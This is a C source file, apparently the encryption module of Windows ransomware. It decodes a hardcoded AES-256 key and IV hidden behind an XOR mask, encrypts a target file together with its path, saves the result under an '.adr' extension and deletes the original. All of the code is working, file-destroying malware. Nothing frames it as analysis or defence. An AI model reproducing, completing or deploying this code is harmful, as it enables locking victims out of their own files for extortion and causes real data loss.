#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include "encryptor.h"

#define FILENAME_PADDING 512

static const unsigned char xor_mask = 0xA5;

static const unsigned char obfuscated_key[32] = {
    0x14, 0x5d, 0x52, 0x3b, 0xd8, 0xa7, 0xa4, 0xeb,
    0x9d, 0x00, 0x6c, 0x42, 0x26, 0x8d, 0xd3, 0x18,
    0x5f, 0x12, 0x22, 0xad, 0xb8, 0xc2, 0x1a, 0x5f,
    0xac, 0x71, 0x96, 0x9e, 0xce, 0xc7, 0x6b, 0xd9
};

static const unsigned char obfuscated_iv[16] = {
    0x99, 0xdb, 0xbc, 0xef, 0xa5, 0x77, 0xf0, 0x16,
    0x33, 0x84, 0x5b, 0xcb, 0x01, 0xac, 0x75, 0x69
};

void restore_key(unsigned char* key_out) {
    for (int i = 0; i < AES_KEY_SIZE; i++) {
        key_out[i] = obfuscated_key[i] ^ xor_mask;
    }
}

void restore_iv(unsigned char* iv_out) {
    for (int i = 0; i < AES_BLOCK_SIZE; i++) {
        iv_out[i] = obfuscated_iv[i] ^ xor_mask;
    }
}

void encrypt_file(const char* filepath, const unsigned char* key, const unsigned char* iv) {
    FILE* in = fopen(filepath, "rb");
    if (!in) return;

    fseek(in, 0, SEEK_END);
    long fsize = ftell(in);
    rewind(in);

    if (fsize <= 0) {
        fclose(in);
        return;
    }

    long plaintext_len = fsize + FILENAME_PADDING;
    unsigned char* plainbuf = calloc(1, plaintext_len);
    if (!plainbuf) {
        fclose(in);
        return;
    }

    fread(plainbuf, 1, fsize, in);
    fclose(in);

    // 전체 경로 저장
    strncpy((char*)(plainbuf + fsize), filepath, FILENAME_PADDING - 1);

    int outlen1 = 0, outlen2 = 0;
    int maxlen = (int)(plaintext_len + EVP_MAX_BLOCK_LENGTH);
    unsigned char* cipherbuf = malloc(maxlen);
    if (!cipherbuf) {
        free(plainbuf);
        return;
    }

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx ||
        !EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) ||
        !EVP_EncryptUpdate(ctx, cipherbuf, &outlen1, plainbuf, (int)plaintext_len) ||
        !EVP_EncryptFinal_ex(ctx, cipherbuf + outlen1, &outlen2)) {
        if (ctx) EVP_CIPHER_CTX_free(ctx);
        free(plainbuf); free(cipherbuf);
        return;
    }

    EVP_CIPHER_CTX_free(ctx);
    free(plainbuf);

    char newname[MAX_PATH];
    snprintf(newname, MAX_PATH, "%s.adr", filepath);
    FILE* out = fopen(newname, "wb");
    if (!out) {
        free(cipherbuf);
        return;
    }

    fwrite(cipherbuf, 1, outlen1 + outlen2, out);
    fclose(out);
    free(cipherbuf);

    DeleteFileA(filepath);
}
